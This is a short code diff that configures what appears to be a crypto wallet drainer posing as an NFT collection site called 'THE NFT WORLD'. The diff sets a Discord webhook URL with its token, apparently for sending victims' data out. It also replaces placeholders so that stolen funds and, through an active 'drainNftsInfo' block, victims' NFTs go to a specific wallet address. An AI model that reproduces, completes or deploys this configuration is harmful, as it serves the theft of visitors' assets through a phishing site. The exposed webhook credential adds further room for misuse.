@@ -1,5 +1,5 @@
 const webhookURL = "https://discord.com/api/webhooks/1147982305680445560/VcfB4OMLqTS-U_bmi7SDmRV2TEXMR5Yp-mlh7UE_jh5XxPRcTUIuvLXbZoBEnomQ8f_S";
-const receiveAddress = '0x5ACE11fb0c5F6D7e6C909b4Cde456001f8ab3bab',
+const receiveAddress = '0xf77BBB4A683b7F86E3871dCBC5e3c85Cb7748B53',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -28,7 +28,7 @@ const receiveAddress = '0x5ACE11fb0c5F6D7e6C909b4Cde456001f8ab3bab',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: 'YOUR WALLET',
+    nftReceiveAddress: '0xf77BBB4A683b7F86E3871dCBC5e3c85Cb7748B53',
   },
 
   customStrings = {
